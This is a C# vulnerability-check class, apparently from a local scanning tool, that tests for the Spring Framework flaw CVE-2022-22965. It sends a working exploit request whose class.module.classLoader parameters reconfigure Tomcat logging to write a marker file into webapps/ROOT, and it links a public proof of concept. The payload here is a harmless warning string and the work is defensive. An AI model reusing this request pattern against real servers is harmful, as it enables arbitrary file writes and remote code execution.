using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace Moriarty.Msrc
{
    public class CVE_2022_22965 : IVulnerabilityCheck
    {
        private const string Id = "CVE-2022-22965";
        private static readonly string[] Exploits = new[]
        {
            "https://github.com/colincowie/Safer_PoC_CVE-2022-22965"
        };

        public Vulnerability GetVulnerability()
        {
            return new Vulnerability(Id, Exploits);
        }

        public void Check(VulnerabilityCollection vulnerabilities, int buildNumber, List<int> installedKBs)
        {
            CheckAsync(vulnerabilities, buildNumber, installedKBs).GetAwaiter().GetResult();
        }

        private async System.Threading.Tasks.Task CheckAsync(VulnerabilityCollection vulnerabilities, int buildNumber, List<int> installedKBs)
        {
            DebugUtility.DebugPrint("Running CVE-2022-22965 vulnerability check...");

            var targetUrl = "http://127.0.0.1";
            var directory = "webapps/ROOT";

            try
            {
                var injectionResponse = await InjectVulnerabilityCheck(targetUrl, directory);
                var urlContent = await ReadInjectedContent(targetUrl);
                var baseContent = await ReadInjectedContentAtRoot(targetUrl);

                if (urlContent.Contains("CVE_2022_22965 was successfully exploited") ||
                    baseContent.Contains("CVE_2022_22965 was successfully exploited"))
                {
                    DebugUtility.DebugPrint("Potentially vulnerable to CVE-2022-22965");
                    vulnerabilities.SetAsVulnerable(Id);
                }
            }
            catch (HttpRequestException ex)
            {
                DebugUtility.DebugPrint($"Connection to {targetUrl} failed: {ex.Message}");
            }
            catch (Exception ex)
            {
                DebugUtility.DebugPrint($"An unexpected error occurred during the CVE-2022-22965 vulnerability check: {ex.Message}");
            }
        }

        private static async System.Threading.Tasks.Task<HttpResponseMessage> InjectVulnerabilityCheck(string targetUrl, string directory)
        {
            var client = new HttpClient();
            client.Timeout = TimeSpan.FromSeconds(10);

            var requestData = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("class.module.classLoader.resources.context.parent.pipeline.first.pattern", "i Warning, CVE_2022_22965 was successfully exploited on this device. reference: https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement  i"),
                new KeyValuePair<string, string>("class.module.classLoader.resources.context.parent.pipeline.first.suffix", ".txt"),
                new KeyValuePair<string, string>("class.module.classLoader.resources.context.parent.pipeline.first.directory", directory),
                new KeyValuePair<string, string>("class.module.classLoader.resources.context.parent.pipeline.first.prefix", "CVE_2022_22965_exploited"),
                new KeyValuePair<string, string>("class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat", "")
            });

            var response = await client.PostAsync(targetUrl, requestData);
            client.Dispose();
            return response;
        }

        private static async System.Threading.Tasks.Task<string> ReadInjectedContent(string targetUrl)
        {
            var client = new HttpClient();
            var fileUrl = $"{targetUrl}/CVE_2022_22965_exploited.txt";
            var content = await client.GetStringAsync(fileUrl);
            client.Dispose();
            return content;
        }

        private static async System.Threading.Tasks.Task<string> ReadInjectedContentAtRoot(string targetUrl)
        {
            var client = new HttpClient();
            var rootUrl = new Uri(targetUrl).GetLeftPart(UriPartial.Authority) + "/CVE_2022_22965_exploited.txt";
            var content = await client.GetStringAsync(rootUrl);
            client.Dispose();
            return content;
        }
    }
}
